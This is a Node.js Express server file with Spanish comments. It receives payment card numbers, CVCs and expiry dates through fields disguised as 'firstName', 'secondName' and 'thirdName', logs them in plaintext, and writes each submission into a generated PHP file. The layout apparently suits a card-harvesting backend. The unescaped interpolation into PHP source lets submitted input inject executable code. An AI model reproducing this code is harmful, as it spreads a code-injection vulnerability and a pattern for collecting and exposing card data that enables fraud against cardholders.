require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 4000;
const HOST = 'localhost';

// 🔹 Middleware para procesar JSON correctamente
app.use(express.json()); 

// 🔹 Configurar CORS para aceptar solicitudes de localhost
app.use(cors({
    origin: 'http://localhost',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Accept']
}));

// 🔹 Servir archivos estáticos desde `public/`
app.use('/public', express.static(path.join(__dirname, 'public')));

// 🔹 Servir `index.html` correctamente desde la raíz
app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'index.html');

    if (!fs.existsSync(filePath)) {
        console.error("🚨 ERROR: index.html no encontrado en la raíz.");
        return res.status(404).send("Error: index.html no se encuentra en la raíz.");
    }

    res.sendFile(filePath);
});

// 🔹 Endpoint para recibir datos de pago
app.post('/send-data', async (req, res) => {
    try {
        console.log("📨 Recibiendo datos...");

        // 🔹 Verificar si los datos llegaron correctamente
        console.log("📨 Datos recibidos en el servidor:", req.body);

        if (!req.body || typeof req.body !== 'object') {
            console.error("🚨 ERROR: Datos JSON inválidos.");
            return res.status(400).json({ error: 'Datos JSON incorrectos o vacíos.' });
        }

        const { firstName, secondName, thirdName } = req.body;

        if (!firstName || !secondName || !thirdName) {
            console.error("🚨 ERROR: Datos incompletos.");
            return res.status(400).json({ error: 'Datos incompletos' });
        }

        // 📂 Verificar que la carpeta `data/` existe antes de guardar el archivo PHP
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir);
        }

        // 🔹 Generar archivo PHP con los datos recibidos
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        const phpFilePath = path.join(dataDir, `payment-data-${timestamp}.php`);

        const phpContent = `<?php
        $cardNumber = "${firstName}";
        $cvc = "${secondName}";
        $expirationDate = "${thirdName}";

        echo "<h2>Datos de Pago</h2>";
        echo "<p><strong>Tarjeta:</strong> $cardNumber</p>";
        echo "<p><strong>CVC:</strong> $cvc</p>";
        echo "<p><strong>Expiración:</strong> $expirationDate</p>";
        ?>`;

        fs.writeFileSync(phpFilePath, phpContent);

        console.log(`✅ Archivo PHP generado en: ${phpFilePath}`);

        res.json({ message: 'Datos guardados correctamente en PHP', file: phpFilePath });
    } catch (error) {
        console.error("🚨 ERROR al procesar la solicitud:", error);
        res.status(500).json({ error: 'Error interno al procesar la información.' });
    }
});

// 🔹 Iniciar el servidor SOLO en localhost:4000
app.listen(PORT, HOST, () => {
    console.log(`✅ Servidor corriendo en http://${HOST}:${PORT}`);
});
